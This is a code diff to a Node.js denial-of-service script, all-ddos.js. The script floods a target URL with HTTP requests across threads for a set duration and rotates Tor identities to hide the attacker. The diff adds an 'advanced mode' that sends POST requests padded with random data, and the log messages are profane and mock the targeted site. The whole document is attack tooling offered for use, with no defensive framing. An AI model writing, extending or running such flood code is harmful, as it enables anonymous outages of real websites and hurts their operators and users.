@@ -26,10 +26,11 @@
  const maxRequestsPerMinute = process.argv[4] || 5000; // Limit requests per minute
  const attackDuration = process.argv[5] || 60; // Attack duration in seconds (default 60)
  const torIdentityInterval = process.argv[6] || 30; // Tor identity renewal interval in seconds
+ const advancedMode = process.argv[7] || false; // Enable advanced features
  
 
  if (!targetURL) {
-  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval]"));
+  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval] [advancedMode]"));
   process.exit(1);
  }
  
@@ -81,6 +82,12 @@
  }
  
 
+ // Advanced features
+ function generateRandomData(sizeInBytes) {
+  return crypto.randomBytes(sizeInBytes).toString('hex');
+ }
+ 
+
  async function attack() {
   const urlObject = new URL(targetURL);
   const hostname = urlObject.hostname;
@@ -122,6 +129,32 @@
 
   if (requestCount < maxRequestsPerMinute) {
   requestCount++;
+ 
+
+  // Advanced mode: Add random data and POST requests
+  if (advancedMode) {
+  options.method = 'POST';
+  const randomDataSize = Math.floor(Math.random() * 1024); // Up to 1KB of random data
+  const postData = generateRandomData(randomDataSize);
+  options.headers['Content-Length'] = postData.length;
+  options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+  options.body = postData;
+ 
+
+  const req = protocol.request(options, (res) => {
+  logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
+  res.on('data', () => {
+  //Consume the fucking data
+  });
+  res.on('end', () => {
+  //fuck, end of data
+  });
+  }).on('error', (err) => {
+  logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
+  });
+  req.write(postData);
+  req.end();
+  } else {
   protocol.get(options, (res) => {
   logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
   res.on('data', () => {
@@ -135,6 +168,7 @@
   }).on('error', (err) => {
   logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
   });
+  }
   } else {
   // if request limit is reached
   logAction(chalk.yellow("Request limit reached. Throttling this shit."));
